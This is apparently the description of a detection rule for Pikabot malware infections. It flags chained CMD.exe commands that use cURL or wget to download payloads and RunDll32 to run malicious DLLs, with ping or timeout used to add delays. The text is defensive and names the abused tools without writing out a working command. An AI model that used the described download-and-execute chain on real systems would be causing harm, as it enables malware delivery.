    Detects the execution of concatenated 'CMD.exe' commands to download and execute payloads via 'cURL' and 'RunDll32'.
    This rule relies on regular expressions for finding supicious patterns in Process Creation commandlines.    
    'ping.exe' and timeout.exe may be abused by adversaries to introduce delays in the command execution.
    'cURL.exe' may be abused by adversaries to download malware and tools.
    'RunDll32.exe' may be abused by adversaries to proxy execution of malicious payloads (dll files). 
    In the observed Pikabot infections, concated commands are used to orchestrate the downlaod and execution of malicious DLL files.       
    This rule also covers potential variations with 'wget' instead of 'cURl'.
